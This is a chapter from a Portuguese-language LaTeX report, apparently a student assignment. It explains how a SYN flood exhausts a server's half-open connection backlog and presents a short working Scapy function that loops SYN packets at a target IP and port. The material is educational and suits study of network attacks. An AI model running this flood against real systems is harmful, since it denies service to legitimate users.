\chapter{Ataque de Exaustão TCP: 3-SynFlood.py}
\label{cap4}

\section{Fundamentação Teórica: Exaustão da Tabela de Estados}
O SYN Flood é um ataque de camada de transporte mais sofisticado. Ele explora a "fila de conexões pendentes" (\textit{backlog queue}) do sistema operativo. Ao enviar múltiplos pacotes SYN e nunca responder ao SYN-ACK do servidor, o atacante deixa as conexões num estado \textit{half-open}. O servidor reserva memória para cada uma destas conexões falsas até que a tabela esgote, impedindo utilizadores legítimos de aceder ao serviço.

\section{Estratégia de Baixo Nível}
Para esta funcionalidade, o uso de sockets padrão de Python é insuficiente, pois o SO gere o handshake automaticamente. Por isso, no ficheiro \texttt{3-SynFlood.py}, utilizou-se a biblioteca \textbf{Scapy}. O Scapy permite a manipulação direta dos cabeçalhos IP e TCP.

\section{Análise Detalhada do Código}

A construção do pacote é feita camada a camada:

\begin{lstlisting}[caption={Manipulação de Flags TCP com Scapy}]
from scapy.all import IP, TCP, send

def syn_flood(dst_ip, dst_port):
    # Camada 3: Definimos o IP de destino.
    ip_layer = IP(dst=dst_ip)
    
    # Camada 4: Definimos o porto e a flag 'S' (SYN).
    # O porto de origem (sport) pode ser aleatório para cada pacote.
    tcp_layer = TCP(sport=1234, dport=dst_port, flags="S")
    
    # Montagem do pacote (Encapsulamento).
    packet = ip_layer / tcp_layer
    
    # Envio contínuo (loop=1) sem esperar por respostas (verbose=0).
    send(packet, loop=1, verbose=0)
\end{lstlisting}

Esta técnica cumpre o requisito 1.3 do enunciado, demonstrando conhecimento avançado sobre protocolos de rede e manipulação de pacotes binários.